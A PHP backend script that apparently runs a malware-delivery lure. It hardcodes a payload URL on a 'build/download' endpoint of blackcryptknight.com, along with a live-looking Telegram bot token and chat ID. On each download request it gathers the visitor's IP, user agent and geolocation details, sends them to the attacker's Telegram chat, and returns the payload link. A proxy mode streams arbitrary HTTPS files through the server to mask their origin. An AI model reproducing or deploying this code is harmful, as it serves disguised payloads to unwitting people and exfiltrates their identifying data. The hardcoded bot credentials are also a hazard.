<?php
// =====================================================
// CONFIGURATION SECTION — EDIT ONLY THESE 3 VALUES
// =====================================================
$DOWNLOAD_URL        = "https://blackcryptknight.com/api/build/c129d6ec-e0bc-4a60-9263-f4c0bf8d5bbe/download";        // Example: https://example.com/file.exe
$TELEGRAM_BOT_TOKEN  = "7284066719:AAFmrZ2q7kWos3sAwvigTquNtFwGEjN3JGY";      // Example: 123456:ABC-xyz
$TELEGRAM_CHAT_ID    = "7724482403";             // Example: 987654321
// =====================================================


// ==================================================================
// PROXY MODE (if ?proxy=1) - MUST RUN BEFORE ANY JSON HEADERS
// ==================================================================
if (isset($_GET['proxy']) && $_GET['proxy'] == "1") {

    // Read incoming url from POST, GET or JSON body
    $rawUrl = null;
    if (!empty($_POST['url'])) {
        $rawUrl = $_POST['url'];
    } elseif (!empty($_GET['url'])) {
        $rawUrl = $_GET['url'];
    } else {
        $inputBody = file_get_contents('php://input');
        if ($inputBody) {
            $jsonBody = json_decode($inputBody, true);
            if (json_last_error() === JSON_ERROR_NONE && !empty($jsonBody['url'])) {
                $rawUrl = $jsonBody['url'];
            }
        }
    }

    if (!$rawUrl) {
        http_response_code(400);
        header('Content-Type: text/plain');
        echo 'Missing url parameter';
        exit;
    }

    // Basic sanitation
    $rawUrl = trim($rawUrl);
    if (preg_match('/[\r\n]/', $rawUrl)) {
        http_response_code(400);
        header('Content-Type: text/plain');
        echo 'Invalid url';
        exit;
    }

    // ---------- Safer ANY-HOST (blocks private/reserved IPs) ----------
    $parsed = parse_url($rawUrl);
    if (!$parsed || empty($parsed['host'])) {
        http_response_code(400);
        header('Content-Type: text/plain');
        echo 'Malformed URL';
        exit;
    }

    $host = $parsed['host'];
    $resolvedIps = @gethostbynamel($host);

    if (empty($resolvedIps)) {
        $resolved = @gethostbyname($host);
        if ($resolved === $host || !$resolved) {
            http_response_code(400);
            header('Content-Type: text/plain');
            echo 'Unable to resolve host';
            exit;
        }
        $resolvedIps = [$resolved];
    }

    foreach ($resolvedIps as $ip) {
        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
            http_response_code(400);
            header('Content-Type: text/plain');
            echo 'Invalid resolved IP';
            exit;
        }
        if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
            http_response_code(403);
            header('Content-Type: text/plain');
            echo 'Access to private/reserved IPs not allowed';
            exit;
        }
    }

    // Enforce HTTPS (optional)
    if (empty($parsed['scheme']) || strtolower($parsed['scheme']) !== 'https') {
        http_response_code(400);
        header('Content-Type: text/plain');
        echo 'Only HTTPS URLs are allowed';
        exit;
    }
    // ------------------------------------------------------------------

    // HEAD request for headers
    $headCh = curl_init($rawUrl);
    curl_setopt($headCh, CURLOPT_NOBODY, true);
    curl_setopt($headCh, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($headCh, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($headCh, CURLOPT_MAXREDIRS, 8);
    curl_setopt($headCh, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($headCh, CURLOPT_HEADER, true);
    curl_setopt($headCh, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($headCh, CURLOPT_TIMEOUT, 30);

    $headResponse = curl_exec($headCh);
    if ($headResponse === false) {
        $err = curl_error($headCh);
        curl_close($headCh);
        http_response_code(502);
        echo "Failed to fetch remote headers: $err";
        exit;
    }

    $remoteContentType = null;
    $remoteContentDisposition = null;
    $remoteContentLength = null;
    $remoteStatusCode = curl_getinfo($headCh, CURLINFO_HTTP_CODE) ?: 200;

    $headerBlocks = preg_split("/\r\n\r\n/", trim($headResponse));
    $lastHeaders = array_pop($headerBlocks);
    $lines = preg_split("/\r\n/", $lastHeaders);

    foreach ($lines as $line) {
        if (stripos($line, 'Content-Type:') === 0) {
            $remoteContentType = trim(substr($line, 13));
        } elseif (stripos($line, 'Content-Disposition:') === 0) {
            $remoteContentDisposition = trim(substr($line, 20));
        } elseif (stripos($line, 'Content-Length:') === 0) {
            $remoteContentLength = trim(substr($line, 16));
        }
    }

    curl_close($headCh);

    if (!headers_sent()) {
        http_response_code($remoteStatusCode);
        header('Content-Type: ' . ($remoteContentType ?: 'application/octet-stream'));

        if ($remoteContentDisposition) {
            header('Content-Disposition: ' . $remoteContentDisposition);
        } else {
            $fallbackName = basename($parsed['path'] ?? 'download.bin');
            header('Content-Disposition: attachment; filename="' . $fallbackName . '"');
        }

        if ($remoteContentLength) {
            header('Content-Length: ' . $remoteContentLength);
        }
    }

    // Stream file
    $ch = curl_init($rawUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 8);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_BUFFERSIZE, 16384);

    curl_setopt($ch, CURLOPT_WRITEFUNCTION, function($curl, $data) {
        echo $data;
        @ob_flush();
        @flush();
        return strlen($data);
    });

    curl_exec($ch);
    curl_close($ch);
    exit;
}


// ==================================================================
// NORMAL MODE (JSON API)
// ==================================================================
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid JSON']);
    exit();
}

function getRealIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = explode(',', $_SERVER[$h])[0];
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return trim($ip);
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

$action = $input['action'] ?? '';

if ($action === 'download') {

    $ip = getRealIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

    // Geo lookup
    $country = $region = $org = $hostname = '';
    $geo = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,org,reverse");

    if ($geo) {
        $g = json_decode($geo, true);
        if (($g['status'] ?? '') === 'success') {
            $country  = $g['country'] ?? '';
            $region   = $g['regionName'] ?? '';
            $org      = $g['org'] ?? '';
            $hostname = $g['reverse'] ?? '';
        }
    }

    // Telegram alert
    if ($TELEGRAM_BOT_TOKEN !== "REPLACE_WITH_TELEGRAM_TOKEN" &&
        $TELEGRAM_CHAT_ID   !== "REPLACE_WITH_CHAT_ID") {

        $msg  = "🌍 New Download Alert!\n\n";
        $msg .= "📌 IP: $ip\n";
        $msg .= "🏳 Country: $country\n";
        $msg .= "📍 Region: $region\n";
        $msg .= "🏢 Org: $org\n";
        $msg .= "🔗 Hostname: $hostname\n";
        $msg .= "🖥 User-Agent: $userAgent\n";

        $turl = "https://api.telegram.org/bot{$TELEGRAM_BOT_TOKEN}/sendMessage";
        file_get_contents($turl . "?chat_id={$TELEGRAM_CHAT_ID}&text=" . urlencode($msg));
    }

    echo json_encode([
        'success' => true,
        'downloadUrl' => $DOWNLOAD_URL,
        'message' => 'Download initiated'
    ]);
    exit;
}

echo json_encode(['error' => 'Unknown action']);
exit;

?>
